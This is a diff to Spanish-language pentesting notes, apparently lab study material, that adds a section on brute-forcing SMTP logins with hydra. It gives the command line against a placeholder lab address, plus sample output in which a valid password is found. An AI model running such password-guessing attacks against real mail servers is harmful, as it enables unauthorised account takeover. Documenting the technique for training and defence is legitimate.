@@ -22,3 +22,25 @@ hydra -l ftp -P passlist.txt ftp://10.10.x.x
 - `ftp://10.10.x.x`: El protocolo y la dirección IP del objetivo.
 
 ----------------------------------
+<h2>SMTP</h2>
+De forma similar a los servidores FTP, también podemos realizar fuerza bruta a los servidores SMTP usando `hydra`. La sintaxis es similar, pero cambia el protocolo objetivo. Si quieres usar otro puerto que no sea el puerto por defecto, deberás especificarlo.
+
+```bash
+user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
+[DATA] attacking smtp://10.10.x.x:25/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
+[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+
